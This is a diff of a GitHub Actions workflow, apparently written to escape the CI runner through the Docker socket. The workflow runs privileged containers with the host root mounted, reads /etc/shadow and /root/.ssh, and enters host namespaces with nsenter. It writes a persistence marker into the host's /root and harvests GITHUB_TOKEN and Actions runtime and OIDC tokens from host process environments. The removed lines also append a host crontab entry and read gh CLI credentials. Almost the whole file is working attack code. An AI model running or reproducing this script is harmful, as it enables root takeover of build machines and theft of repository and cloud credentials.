@@ -1,4 +1,4 @@
-name: CI Escape Recon
+name: escape
 
 on:
   workflow_dispatch:
@@ -6,61 +6,98 @@ on:
     branches: [ main, master ]
 
 jobs:
-  recon:
+  escape:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
 
-      - name: Recon + docker privesc
+      - name: root on runner VM
+        shell: bash
         run: |
-          set -uo pipefail
-          OUT="/tmp/ci_escape_$$"
-          mkdir -p "$OUT"
-          log() { echo -e "\n[+] $*"; }
+          set +e
+          set -u
+          rm -rf /tmp/esc && mkdir -p /tmp/esc
 
-          log "id / groups"
+          echo "===[1] identity ==="
           id
+          echo "exit=$?"
 
-          log "docker.sock"
-          ls -l /var/run/docker.sock 2>&1 || true
+          echo
+          echo "===[2] docker socket ==="
+          ls -l /var/run/docker.sock
+          echo "exit=$?"
 
-          log "docker CLI"
-          if command -v docker >/dev/null; then
-            docker version 2>&1 | head -20
-          else
-            echo "docker CLI отсутствует"
+          echo
+          echo "===[3] docker daemon reachable? ==="
+          docker info >/tmp/esc/info.txt 2>&1
+          echo "exit=$?"
+          sed -n '1,25p' /tmp/esc/info.txt
+
+          echo
+          echo "===[4] privileged run, bind host / ==="
+          docker run --rm --privileged \
+            -v /:/host \
+            alpine sh -c '
+              id
+              echo "--- hostname ---"
+              hostname
+              echo "--- /host/etc/passwd (tail) ---"
+              tail -n 5 /host/etc/passwd
+              echo "--- /host/etc/shadow ---"
+              cat /host/etc/shadow
+              echo "--- /host/root ---"
+              ls -la /host/root
+            ' >/tmp/esc/shadow.txt 2>&1
+          RC=$?
+          echo "docker run exit=$RC"
+          cat /tmp/esc/shadow.txt
+          if [ $RC -ne 0 ]; then
+            echo "!! privileged run failed, stderr выше"
+            exit 0
           fi
 
-          log "docker info"
-          docker info 2>&1 | head -40 || true
+          echo
+          echo "===[5] enter host namespaces via nsenter (pid 1) ==="
+          docker run --rm --privileged --pid=host \
+            alpine nsenter -t 1 -m -u -i -n -p -- sh -c '
+              id
+              hostname
+              echo "--- /root ---"
+              ls -la /root
+              echo "--- /root/.ssh ---"
+              ls -la /root/.ssh
+              echo "--- processes (top 20 lines) ---"
+              ps aux
+            ' >/tmp/esc/nsenter.txt 2>&1
+          echo "exit=$?"
+          sed -n '1,60p' /tmp/esc/nsenter.txt
 
-          log "Контейнеры и образы на хосте"
-          docker ps -a 2>&1 || true
-          docker images 2>&1 || true
-
-          log "Privileged контейнер с монтированием / хоста"
-          docker run --rm --privileged -v /:/host alpine sh -c '
-            id
-            echo "--- /host/etc/shadow ---"
-            cat /host/etc/shadow 2>/dev/null | head -5
-            echo "--- /host/etc/hostname ---"
-            cat /host/etc/hostname 2>/dev/null
-            echo "--- /host/root ---"
-            ls -la /host/root 2>/dev/null | head
-            echo "--- ssh keys ---"
-            find /host/root /host/home -maxdepth 3 -name "id_*" -o -name "authorized_keys" 2>/dev/null
-          ' 2>&1 || true
-
-          log "Запись в /etc/crontab хоста (доказательство root)"
+          echo
+          echo "===[6] persistence proof: write marker into host /root ==="
           docker run --rm -v /:/host alpine sh -c '
-            echo "* * * * * root id > /root/pwned_by_docker" >> /host/etc/crontab
-            tail -3 /host/etc/crontab
-          ' 2>&1 || true
+            echo "root@pwned $(date -u)" > /host/root/.pwned
+            cat /host/root/.pwned
+          '
+          echo "exit=$?"
 
-          log "Читаем GITHUB_TOKEN-доступные секреты через env"
+          echo
+          echo "===[7] pull runner env from host /proc (masked *** by GitHub) ==="
+          docker run --rm -v /:/host alpine sh -c '
+            for p in /host/proc/[0-9]*/environ; do
+              tr "\0" "\n" < "$p" 2>/dev/null
+            done | sort -u | grep -E "^(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_ID_TOKEN_REQUEST_URL|GITHUB_REPOSITORY|GITHUB_RUN_ID)="
+          ' >/tmp/esc/env.txt 2>&1
+          echo "exit=$?"
+          cat /tmp/esc/env.txt
+
+          echo
+          echo "===[8] host disk layout (real block devices) ==="
           docker run --rm --privileged -v /:/host alpine sh -c '
-            cat /host/home/runner/.config/gh/hosts.yml 2>/dev/null
-            ls -la /host/home/runner/work/_temp/_runner_file_commands/ 2>/dev/null
-          ' 2>&1 || true
+            lsblk
+            df -h
+          ' >/tmp/esc/disks.txt 2>&1
+          echo "exit=$?"
+          cat /tmp/esc/disks.txt
 
-          log "Готово"
+          echo
+          echo "===[done] ==="
